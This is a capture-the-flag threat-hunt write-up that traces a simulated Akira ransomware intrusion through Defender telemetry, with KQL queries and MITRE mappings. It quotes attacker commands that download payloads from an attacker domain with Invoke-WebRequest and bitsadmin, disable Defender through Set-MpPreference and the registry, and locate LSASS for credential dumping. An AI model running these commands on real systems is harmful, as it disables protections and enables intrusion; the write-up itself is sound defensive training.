# 🚩 Ashford Sterling Recruitment — Akira Ransomware IR

### Threat Hunt CTF Writeup | Microsoft Defender for Endpoint (MDE)

---

## 📋 Incident Brief

**Organisation:** Ashford Sterling Recruitment
**Compromised Systems:** `as-pc2`, `as-srv`
**Timeframe:** 2026-01-27
**Difficulty:** Advanced

**Situation:** Following the initial compromise investigated in "The Broker", a ransomware affiliate returned to the environment using pre-staged access. The threat actor deployed Akira ransomware across the network, encrypting the file server (`as-srv`) and exfiltrating sensitive data before demanding £65,000 in ransom. The investigation required working backwards from ransomware impact, tracking attacker activity across multiple hosts, and correlating infrastructure from the first investigation.

---

## ⚔️ Attack Chain Overview

```
Initial Access          Execution               Defence Evasion
Pre-staged AnyDesk  →   wsync.exe beacon    →   kill.bat (Defender disable)
(C:\Users\Public\)      (C:\ProgramData\)       DisableAntiSpyware registry

Credential Access       Discovery               Lateral Movement
LSASS dump via      →   Advanced IP Scanner →   david.mitchell → as-srv
named pipe              subnet sweep            SMB + AnyDesk

Collection              Exfiltration            Impact
st.exe → exfil_data →   sync.cloud-endpoint →   updater.exe (Akira)
.zip staging            .net                    VSS deletion + encryption
```

| Stage | Tactic | Key Finding |
|---|---|---|
| Initial Access | Pre-staged remote access | `AnyDesk.exe` at `C:\Users\Public\` from The Broker |
| Persistence | C2 beacon deployment | `wsync.exe` via `Invoke-WebRequest` from `sync.cloud-endpoint.net` |
| Defence Evasion | Defender tampered | `kill.bat` + registry `DisableAntiSpyware` |
| Credential Access | LSASS memory read | PowerShell → `\Device\NamedPipe\lsass` |
| Discovery | Network scan | `scan.exe` (Advanced IP Scanner) across subnets |
| Lateral Movement | SMB + AnyDesk | `david.mitchell` creds to `as-srv` |
| Collection | Data staging | `st.exe` archived data to `exfil_data.zip` |
| Impact | Ransomware deployment | `updater.exe` (Akira) encrypted all shares |

---

## 🚩 Flag Writeups

### Section 1: Ransom Note Analysis

---

### Flag 1 — IDENTIFICATION: Threat Actor

**Question:** What ransomware group is responsible?
**Answer:** `Akira`
**Table:** N/A — Ransom note analysis

#### How It Was Found

The ransom note (`akira_readme.txt`) provided directly in the challenge brief was signed by the threat actor group.

#### Logic & Reasoning

The note signed off as "Akira Team" and referenced `.akira` file extension appended to all encrypted files. Akira is a ransomware-as-a-service operation active since 2023, known for double extortion and targeting SMBs. The negotiation chat example confirmed this was a real Akira affiliate operation.

---

### Flag 2 — IDENTIFICATION: Negotiation Portal

**Question:** What is the TOR negotiation address?
**Answer:** `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion`
**Table:** `DeviceFileEvents`, `DeviceEvents`

#### How It Was Found

Rather than reading the onion address from the blurry ransom note screenshot (which contained ambiguous `1`, `l`, and `I` characters), the exact string was retrieved from MDE telemetry using PowerShell script block logging.

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-27T22:00:00Z) .. datetime(2026-01-27T22:30:00Z))
| where DeviceName == "as-srv"
| where ActionType == "PowerShellCommand"
| project TimeGenerated, AdditionalFields, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The ransom note was opened in Notepad by `AS-SRV\AS.SRV.Administrator` at `9:48 PM`, confirmed via the MDE Timeline search on `as-srv`. Going directly to telemetry avoided character ambiguity common in screenshots. The `akira_readme.lnk` shortcut flagged as T1204.002 (Malicious File) and T1547.009 (Shortcut Modification) confirmed the file was dropped maliciously.

---

### Flag 3 — IDENTIFICATION: Victim ID

**Question:** What is the company's unique negotiation ID?
**Answer:** `813R-QWJM-XKIJ`
**Table:** N/A — Ransom note analysis

#### How It Was Found

Extracted directly from the ransom note provided in the challenge. No query required.

#### Logic & Reasoning

Akira assigns each victim a unique personal ID used in TOR negotiation to authenticate the victim and track payment. This ID was visible in the `akira_readme.txt` content: "Your personal ID: 813R-QWJM-XKIJ".

---

### Flag 4 — IDENTIFICATION: Encrypted Extension

**Question:** What file extension is added to encrypted files?
**Answer:** `.akira`
**Table:** N/A — Ransom note analysis

#### How It Was Found

Extracted directly from the ransom note. No query required.

#### Logic & Reasoning

The note explicitly stated: "The extension `.akira` has been added to all affected files." This was also visible in the file server screenshot showing encrypted files in `C:\Shares\Clients\Backups_PLC\` with the `.akira` extension appended.

---

### Section 2: Payload Infrastructure

---

### Flag 5 — INFRASTRUCTURE: Payload Domain

**Question:** What domain hosted the payloads?
**Answer:** `sync.cloud-endpoint.net`
**Table:** `DeviceEvents` (PowerShell script block logging)

#### How It Was Found

PowerShell script block logging captured the exact `Invoke-WebRequest` commands used to download tools after `bitsadmin` failed.

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-27T20:15:00Z) .. datetime(2026-01-27T20:25:00Z))
| where DeviceName == "as-pc2"
| where ActionType == "PowerShellCommand"
| project TimeGenerated, AdditionalFields, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The script block logs revealed two download commands:
- `Invoke-WebRequest -Uri "https://sync.cloud-endpoint.net/scan.exe" -OutFile "C:\\Users\\david.mitchell\\Downloads\\scan.exe"`
- `Invoke-WebRequest -Uri "https://sync.cloud-endpoint.net/wsync.exe" -OutFile "C:\\ProgramData\\wsync.exe"`

The attacker first attempted `bitsadmin /transfer` (Q28) which had issues, then fell back to PowerShell's `Invoke-WebRequest`. `sync.cloud-endpoint.net` served as the primary payload delivery server.

**Reference:** [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

---

### Flag 6 — INFRASTRUCTURE: Ransomware Staging Domain

**Question:** What domain staged the ransomware?
**Answer:** `cdn.cloud-endpoint.net`
**Table:** `DeviceNetworkEvents`

#### How It Was Found

Queried `DeviceNetworkEvents` for outbound connections from attacker-controlled processes during the ransomware deployment window.

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName in ("as-pc2", "as-srv")
| where not(ipv4_is_private(RemoteIP))
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, DeviceName, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

At `10:18 PM` — seconds before `updater.exe` executed — `wsync.exe` connected to `cdn.cloud-endpoint.net` (`104.21.30.237`). This CDN subdomain served as the ransomware binary hosting and post-execution staging endpoint, separate from the C2/delivery subdomain `sync.cloud-endpoint.net`. The split between subdomains is typical attacker infrastructure separation.

**Reference:** [T1583.001 — Acquire Infrastructure: Domains](https://attack.mitre.org/techniques/T1583/001/)

---

### Flag 7 — INFRASTRUCTURE: C2 IP Addresses

**Question:** What are the two C2 IP addresses?
**Answer:** `172.67.174.46, 104.21.30.237`
**Table:** `DeviceNetworkEvents`

#### How It Was Found

Identified from the `DeviceNetworkEvents` query above. Both IPs resolved from attacker-controlled subdomains of `cloud-endpoint.net`.

#### Logic & Reasoning

`172.67.174.46` resolved from `sync.cloud-endpoint.net` (C2/delivery) and `104.21.30.237` resolved from `cdn.cloud-endpoint.net` (staging/ransomware). Both fall within Cloudflare's IP ranges — the attacker proxied their infrastructure through Cloudflare to mask the true origin server, a common technique for ransomware affiliates.

---

### Flag 8 — INFRASTRUCTURE: Remote Tool Relay

**Question:** What is the remote tool relay domain that was used?
**Answer:** `relay-0b975d23.net.anydesk.com`
**Table:** `DeviceNetworkEvents`

#### How It Was Found

Identified from `DeviceNetworkEvents` on `as-srv` where `anydesk.exe` made an outbound connection at `10:08 PM` — 10 minutes before ransomware execution.

#### Logic & Reasoning

AnyDesk routes connections through relay servers when direct peer-to-peer on port 7070 is blocked. The relay domain `relay-0b975d23.net.anydesk.com` is a unique relay identifier. This connection at `10:08 PM` gave the attacker hands-on-keyboard access to `as-srv` to manually deploy `updater.exe`, confirming this was a human-operated attack.

**Reference:** [T1219 — Remote Access Software](https://attack.mitre.org/techniques/T1219/)

---

### Section 3: Defence Evasion

---

### Flag 9 — EVASION: Evasion Script

**Question:** What script disabled security controls?
**Answer:** `kill.bat`
**Table:** `DeviceFileEvents`, MDE Alert Process Tree

#### How It Was Found

Identified from the MDE alert process tree for "Attempt to turn off Microsoft Defender Antivirus protection" on `as-pc2`. `wsync.exe` created `kill.bat` at `C:\ProgramData\kill.bat` which was then executed via `cmd.exe /c C:\ProgramData\kill.bat`.

#### Logic & Reasoning

`kill.bat` orchestrated the entire Defender tamper chain: `Set-MpPreference -DisableRealtimeMonitoring $true`, `Set-MpPreference -DisableBehaviorMonitoring $true`, `Set-MpPreference -DisableIOAVProtection $true`, and the `reg.exe` registry modification. Disabling Defender before credential access and ransomware deployment is standard ransomware affiliate procedure to prevent detection of `lsass` memory reads and the encryption binary.

**Reference:** [T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

---

### Flag 10 — EVASION: Evasion Script Hash

**Question:** What is the SHA256 of the evasion script?
**Answer:** `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3b96c`
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName in ("as-pc2", "as-srv")
| where FileName == "kill.bat"
| project TimeGenerated, DeviceName, FileName, FolderPath,
          SHA256, MD5, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

`DeviceFileEvents` captures SHA256 hashes at file creation time. The single result confirmed `kill.bat` was created by `wsync.exe` at `9:02 PM` at `C:\ProgramData\kill.bat`. The hash can be used for IOC matching across other environments without uploading to VirusTotal per challenge instructions.

---

### Flag 11 — EVASION: Registry Tampering

**Question:** What registry value disabled Windows Defender?
**Answer:** `DisableAntiSpyware`
**Table:** MDE Alert Process Tree, `DeviceRegistryEvents`

#### How It Was Found

Visible in the MDE alert process tree: `reg.exe reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`

#### Logic & Reasoning

Setting `DisableAntiSpyware = 1` under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` is a policy-level Defender kill that persists across reboots and cannot be reversed by `Set-MpPreference` alone. Unlike runtime-only PowerShell tampering, this registry modification survives service restarts, making it the most persistent of the Defender disabling techniques used. MDE flagged this as T1562.001.

**Reference:** [T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)

---

### Flag 12 — EVASION: Registry Timestamp

**Question:** What time was the registry modified? (UTC)
**Answer:** `21:03:42`
**Table:** `DeviceRegistryEvents`

#### How It Was Found

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where RegistryKey contains "Windows Defender"
| where ActionType == "RegistryValueSet"
| project TimeGenerated, RegistryKey, RegistryValueName,
          RegistryValueData, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The MDE UI displays local time, making it unreliable for UTC answers. Querying `DeviceRegistryEvents` directly returned the UTC timestamp `2026-01-27T21:03:42.396Z`. The full Defender tamper sequence took 3 seconds: `DisableBehaviorMonitoring` at `21:03:39`, `DisableIOAVProtection` at `21:03:41`, and `DisableAntiSpyware` at `21:03:42`.

---

### Section 4: Credential Access

---

### Flag 13 — CREDENTIAL ACCESS: Process Hunt

**Question:** What command was used to enumerate processes for credential theft?
**Answer:** `tasklist | findstr lsass`
**Table:** `DeviceProcessEvents`

#### How It Was Found

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-27T21:00:00Z) .. datetime(2026-01-27T21:20:00Z))
| where DeviceName == "as-pc2"
| where ProcessCommandLine has "tasklist"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

Before dumping LSASS memory, the attacker confirmed the process was running by piping `tasklist` output to `findstr lsass`. `wsync.exe` executed this command twice — at `9:11 PM` and `9:14 PM` — likely to verify the PID before targeting it. The full command was `cmd.exe /c "tasklist | findstr lsass"` but the challenge accepted the inner pipe command.

**Reference:** [T1057 — Process Discovery](https://attack.mitre.org/techniques/T1057/)

---

### Flag 14 — CREDENTIAL ACCESS: Credential Pipe

**Question:** What named pipe was accessed during credential theft?
**Answer:** `\Device\NamedPipe\lsass`
**Table:** `DeviceEvents`

#### How It Was Found

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-27T21:30:00Z) .. datetime(2026-01-27T22:00:00Z))
| where DeviceName == "as-pc2"
| where ActionType == "NamedPipeEvent"
| where AdditionalFields has_any ("lsass", "mimikatz", "ntds", "sekurlsa")
    or InitiatingProcessCommandLine has_any ("powershell", "wsync", "rundll32")
| project TimeGenerated, AdditionalFields, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

`DeviceEvents` with `ActionType == "NamedPipeEvent"` captures named pipe interactions. The result at `9:42 PM` showed `PipeName: \\Device\\NamedPipe\\lsass` with `FileOperation: File opened` and `NamedPipeEnd: Client` — the attacker's process was the client connecting to the LSASS pipe. This preceded the confirmed LSASS memory read at `9:45 PM` and is consistent with Mimikatz or a similar credential dumping tool accessing LSASS via its named pipe interface.

**Reference:** [T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

---

### Section 5: Pre-Staged Access

---

### Flag 15 — PERSISTENCE: Remote Access Tool

**Question:** What remote access tool was used?
**Answer:** `AnyDesk`
**Table:** `DeviceNetworkEvents`, `DeviceProcessEvents`

#### How It Was Found

Identified from `DeviceNetworkEvents` showing `anydesk.exe` connecting to `relay-0b975d23.net.anydesk.com` on `as-srv` at `10:08 PM`, and from `DeviceProcessEvents` showing `AnyDesk.exe` running on `as-pc2` from an unusual path.

#### Logic & Reasoning

AnyDesk was pre-staged during The Broker attack and left as a persistent backdoor. The incident brief stated the affiliate "returned to the environment using pre-staged access" — AnyDesk installed at `C:\Users\Public\` (rather than the legitimate `C:\Program Files (x86)\AnyDesk\`) was the mechanism. On `as-srv`, AnyDesk ran under `as.srv.administrator` confirming full administrative access.

**Reference:** [T1219 — Remote Access Software](https://attack.mitre.org/techniques/T1219/)

---

### Flag 16 — PERSISTENCE: Suspicious Execution Path

**Question:** What directory was the remote access tool executed from?
**Answer:** `C:\Users\Public`
**Table:** `DeviceProcessEvents`

#### How It Was Found

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where FileName =~ "AnyDesk.exe" or ProcessCommandLine has_any ("anydesk", "AnyDesk")
| project TimeGenerated, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

Every `AnyDesk.exe` execution on `as-pc2` showed `FolderPath: C:\Users\Public\AnyDesk.exe`. `C:\Users\Public` is world-writable without admin rights, making it a favourite attacker staging location. Legitimate AnyDesk installs to `C:\Program Files (x86)\AnyDesk\`. The binary was auto-started via `sihost.exe` (Shell Infrastructure Host), meaning it launched with the user's shell session — providing persistent access on every login.

**Reference:** [T1547 — Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/)

---

### Flag 17 — INITIAL ACCESS: Attacker IP

**Question:** What is the attacker's external IP?
**Answer:** `88.97.164.155`
**Table:** `DeviceNetworkEvents`

#### How It Was Found

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where InitiatingProcessFileName =~ "AnyDesk.exe"
| where not(ipv4_is_private(RemoteIP))
| project TimeGenerated, RemoteIP, RemotePort, LocalIP, LocalPort, ActionType
| sort by TimeGenerated asc
```

#### Logic & Reasoning

AnyDesk uses port `7070` for direct peer-to-peer connections between attacker and victim. `88.97.164.155` attempted connections on port `7070` multiple times with `ConnectionFailed` — indicating the direct P2P path was blocked by firewall rules, forcing traffic through the AnyDesk relay server instead. The repeated port `7070` attempts from this single external IP identify it as the attacker's machine.

---

### Flag 18 — INITIAL ACCESS: Compromised User

**Question:** What user was compromised on AS-PC2?
**Answer:** `David.Mitchell`
**Table:** MDE Alert, `DeviceLogonEvents`

#### How It Was Found

Identified from the first MDE alert examined — "Attempt to turn off Microsoft Defender Antivirus protection" on `as-pc2` showed `AS-PC2\David.Mitchell` as the affected user. Confirmed throughout all subsequent process events.

#### Logic & Reasoning

`David.Mitchell` was the active user session on `as-pc2` when the attacker gained access via pre-staged AnyDesk. All attacker activity — `wsync.exe` execution, `kill.bat` creation, LSASS dumping — ran under this user context. The credential dump then yielded `david.mitchell`'s credentials for lateral movement to `as-srv`.

---

### Section 6: C2 Beacon

---

### Flag 19 — PERSISTENCE: Primary Beacon

**Question:** What new C2 beacon was deployed?
**Answer:** `wsync.exe`
**Table:** `DeviceFileEvents`, `DeviceProcessEvents`

#### How It Was Found

`wsync.exe` appeared as the initiating process across nearly every attacker action on `as-pc2` — creating `kill.bat`, running `tasklist | findstr lsass`, executing `bitsadmin` downloads, and connecting to `sync.cloud-endpoint.net`.

#### Logic & Reasoning

The name `wsync.exe` is a masquerade — designed to blend in with Windows sync services. It functioned as the primary C2 implant: receiving commands from `sync.cloud-endpoint.net`, executing them, and downloading additional tooling. The brief stated a pre-staged beacon had failed; `wsync.exe` was the replacement deployed via `Invoke-WebRequest` from the attacker's payload server.

**Reference:** [T1036.005 — Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)

---

### Flag 20 — PERSISTENCE: Beacon Location

**Question:** What directory was the new beacon deployed to?
**Answer:** `C:\ProgramData`
**Table:** `DeviceFileEvents`

#### How It Was Found

Confirmed from the `DeviceFileEvents` query showing `wsync.exe` created at `C:\ProgramData\wsync.exe` by `"powershell.exe"` at `8:22 PM`.

#### Logic & Reasoning

`C:\ProgramData` is writable by standard users, not user-profile-specific, survives across sessions, and is not obviously visible to casual inspection. This directory was used to stage all attacker tools: `wsync.exe`, `kill.bat`, `clean.bat`, and `updater.exe`. It is a consistent Akira affiliate staging preference.

---

### Flag 21 — PERSISTENCE: Original Beacon Hash

**Question:** What is the SHA256 of the original beacon?
**Answer:** `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b`
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where FileName == "wsync.exe"
| project TimeGenerated, FileName, FolderPath, ActionType, SHA256, MD5,
          InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

Two `FileCreated` events existed for `wsync.exe` — one at `8:22 PM` (original) and one at `8:44 PM` (replacement). The challenge asked for the original, which was the first chronologically. The hash difference between the two versions indicates the attacker pushed an updated beacon — likely because the first version encountered detection or stability issues.

---

### Flag 22 — PERSISTENCE: Replacement Beacon Hash

**Question:** What is the SHA256 of the replacement beacon?
**Answer:** `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654`
**Table:** `DeviceFileEvents`

#### How It Was Found

From the same query as Flag 21. The `FileModified` event at `8:44:32 PM` captured the hash of the replacement `wsync.exe`.

#### Logic & Reasoning

The replacement beacon was created at `8:44 PM` and immediately modified (common for self-configuring implants writing their config on first run). The `FileModified` event captured the final hash. Having two distinct beacon hashes confirms the attacker actively maintained and updated their C2 tooling during the operation.

---

### Section 7: Network Scanning

---

### Flag 23 — DISCOVERY: Scanner Tool

**Question:** What scanner tool was used?
**Answer:** `scan.exe`
**Table:** `DeviceProcessEvents`, MDE Alert

#### How It Was Found

Visible in the MDE alert process tree at `3:17 PM` where PowerShell (PID 5104) created `scan.exe`, and MDE flagged it as "AdvancedIpScanner" related to T1046 (Network Service Discovery).

#### Logic & Reasoning

`scan.exe` is a renamed portable copy of Advanced IP Scanner — a legitimate network scanning tool commonly abused by ransomware affiliates for network reconnaissance. The renaming to `scan.exe` is a basic obfuscation attempt. MDE's behavioural detection correctly identified the underlying tool despite the rename.

**Reference:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/)

---

### Flag 24 — DISCOVERY: Scanner Hash

**Question:** What is the SHA256 of the scanner tool?
**Answer:** `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b`
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where FileName == "scan.exe"
| project TimeGenerated, FileName, FolderPath, ActionType, SHA256, MD5,
          InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

`scan.exe` was a self-extracting archive that unpacked `advanced_ip_scanner.exe` at runtime via `scan.tmp /SL5=...`. The SHA256 represents the outer wrapper binary. The process chain was: `powershell.exe` → `scan.exe` → `scan.tmp` → `advanced_ip_scanner.exe`.

---

### Flag 25 — DISCOVERY: Scanner Execution Arguments

**Question:** What arguments were passed to the scanner on execution?
**Answer:** `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us`
**Table:** `DeviceProcessEvents`

#### How It Was Found

From the `DeviceProcessEvents` query filtered for `scan.exe`. The full `advanced_ip_scanner.exe` command line captured by MDE was:

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-pc2"
| where FileName == "scan.exe" or ProcessCommandLine has "scan.exe"
    or InitiatingProcessCommandLine has "scan.exe"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The `/portable` flag runs Advanced IP Scanner without installation, keeping artifacts in the specified directory (`C:\Users\david.mitchell\Downloads\`). The `/lng en_us` flag sets the UI language. Running portable avoids registry writes and is a common attacker technique to minimise forensic footprint.

---

### Flag 26 — DISCOVERY: Network Enumeration Targets

**Question:** What two internal IPs were enumerated?
**Answer:** `10.1.0.154, 10.1.0.183`
**Table:** `DeviceNetworkEvents`

#### How It Was Found

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-srv"
| where RemotePort == 445 or LocalPort == 445
| where ipv4_is_private(RemoteIP)
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, RemoteIP, LocalIP, RemotePort, LocalPort, ActionType,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

Querying from `as-srv`'s perspective (rather than `as-pc2`) revealed two successful SMB connections at `10:16 PM` — just 2 minutes before `updater.exe` was dropped. `10.1.0.183` is `as-pc2` (the beachhead) and `10.1.0.154` is another internal host. These SMB connections represent the final share enumeration step immediately before ransomware deployment, confirming the attacker mapped available shares before encrypting them.

---

### Section 8: Lateral Movement

---

### Flag 27 — LATERAL MOVEMENT: Lateral Account

**Question:** What account was used to authenticate to AS-SRV?
**Answer:** `as.srv.administrator`
**Table:** `DeviceProcessEvents`, `DeviceLogonEvents`

#### How It Was Found

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where RemoteIP == "10.1.0.183"
| project TimeGenerated, DeviceName, AccountName, AccountDomain,
          LogonType, RemoteIP
| sort by TimeGenerated asc
```

Also confirmed via `DeviceProcessEvents` showing `AnyDesk.exe` on `as-srv` running under `as.srv.administrator`.

#### Logic & Reasoning

The credential dump from `as-pc2` yielded `david.mitchell`'s credentials (used for SMB enumeration) and the `as.srv.administrator` local account (used for AnyDesk). The administrator account on `as-srv` was likely obtained during The Broker attack or via credential reuse. Having local admin via AnyDesk gave the attacker full control to deploy the ransomware binary.

**Reference:** [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)

---

### Section 9: Download Methods

---

### Flag 28 — EXECUTION: Download Method (LOLBin)

**Question:** What LOLBin was first used to download tools?
**Answer:** `bitsadmin.exe`
**Table:** `DeviceProcessEvents`

#### How It Was Found

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName in ("as-pc2", "as-srv")
| where ProcessCommandLine has_any (
    "certutil", "bitsadmin", "Invoke-WebRequest",
    "wget", "curl", "DownloadFile", "iwr", "Start-BitsTransfer"
  )
| project TimeGenerated, DeviceName, ProcessCommandLine,
          InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

`bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe` was attempted multiple times at `8:14–8:16 PM` to different destinations (`C:\Users\Public\`, `C:\Temp\`, `C:\Users\david.mitchell\Downloads\`) — the repeated attempts to different paths indicate BITS transfer failures. `bitsadmin` is a native Windows binary (LOLBin) that can transfer files over HTTP/HTTPS, making it an attractive choice for evading proxy controls and application whitelisting.

**Reference:** [T1197 — BITS Jobs](https://attack.mitre.org/techniques/T1197/)

---

### Flag 29 — EXECUTION: Fallback Download Method

**Question:** What PowerShell cmdlet was used as the fallback?
**Answer:** `Invoke-WebRequest`
**Table:** `DeviceEvents` (PowerShell script block logging)

#### How It Was Found

```kql
DeviceEvents
| where TimeGenerated between (datetime(2026-01-27T20:15:00Z) .. datetime(2026-01-27T20:25:00Z))
| where DeviceName == "as-pc2"
| where ActionType == "PowerShellCommand"
| project TimeGenerated, AdditionalFields, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

After `bitsadmin` failed, the attacker switched to `Invoke-WebRequest` (alias `iwr`/`wget` in PowerShell). Script block logging captured the exact commands: `Invoke-WebRequest -Uri "https://sync.cloud-endpoint.net/scan.exe" -OutFile "C:\\Users\\david.mitchell\\Downloads\\scan.exe"`. This technique is logged by PowerShell's built-in script block logging (Event ID 4104), which MDE surfaces via `DeviceEvents`.

**Reference:** [T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)

---

### Section 10: Data Exfiltration

---

### Flag 30 — COLLECTION: Staging Tool

**Question:** What staging tool compressed the data?
**Answer:** `st.exe`
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName in ("as-pc2", "as-srv")
| where FileName has_any (".zip", ".7z", ".rar")
    or FileName has_any ("7z", "7zip", "winrar", "rar.exe")
| project TimeGenerated, DeviceName, FileName, FolderPath,
          ActionType, SHA256, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

`st.exe` (short for "staging tool") created `C:\Users\Public\exfil_data.zip` on `as-srv` at `10:24 PM`. The name is a renamed archiving utility — likely 7-Zip or WinRAR — used to compress data for exfiltration before the ransom note was left. Double extortion (exfil then encrypt) is Akira's standard operating procedure, giving them leverage even if the victim restores from backup.

**Reference:** [T1560.001 — Archive Collected Data: Archive via Utility](https://attack.mitre.org/techniques/T1560/001/)

---

### Flag 31 — COLLECTION: Staging Tool Hash

**Question:** What is the SHA256 of the staging tool?
**Answer:** `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015`
**Table:** `DeviceFileEvents`

#### How It Was Found

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-27T13:00:00Z) .. datetime(2026-01-27T23:59:00Z))
| where DeviceName == "as-srv"
| where FileName == "st.exe"
| project TimeGenerated, FileName, FolderPath, ActionType, SHA256,
          InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

#### Logic & Reasoning

The hash of `st.exe` uniquely identifies this specific build of the staging tool. Importantly, the SHA256 of `exfil_data.zip` (`082fb434...`) is different — the question asked for the tool, not the archive it created.

---

### Flag 32 — COLLECTION: Exfil Archive

**Question:** What archive was created for exfiltration?
**Answer:** `exfil_data.zip`
**Table:** `DeviceFileEvents`

#### How It Was Found

Identified from the `DeviceFileEvents` query above. `st.exe` created `C:\Users\Public\exfil_data.zip` on `as-srv` at `10:24 PM` — 6 minutes after ransomware execution began at `10:18 PM`.

#### Logic & Reasoning

The archive was staged at `C:\Users\Public\` — the same world-writable directory used for AnyDesk — making it accessible for upload regardless of user permissions. The timing (after encryption started) suggests exfiltration ran concurrently with or immediately after encryption, consistent with Akira's double extortion model. The ransom note listed stolen data categories: financial documents, employee PII, customer databases, and contracts.

**Reference:** [T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)

---

### Section 11: Ransomware Deployment

---

### Flag 33 — IMPACT: Ransomware Filename

**Question:** What is the ransomware filename?
**Answer:** `updater.exe`
**Table:** `DeviceFileEvents`, `DeviceProcessEvents`

#### How It Was Found

Identified from `DeviceFileEvents` on `as-srv` showing `updater.exe` created at `C:\ProgramData\updater.exe` by `"powershell.exe"` at `10:15 PM`, then executing at `10:18 PM`.

#### Logic & Reasoning

The ransomware was named `updater.exe` to masquerade as Google Updater, which also runs `updater.exe` from `C:\Program Files (x86)\Google\GoogleUpdater\`. MDE telemetry distinguished the malicious instance by its path (`C:\ProgramData\`) and initiating process (`powershell.exe` rather than `services.exe` or `svchost.exe`). The legitimate Google Updater ran concurrently on the same host, making the masquerade plausible.

**Reference:** [T1036.005 — Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)

---

### Flag 34 — IMPACT: Ransomware Hash

**Question:** What is the SHA256 of the ransomware?
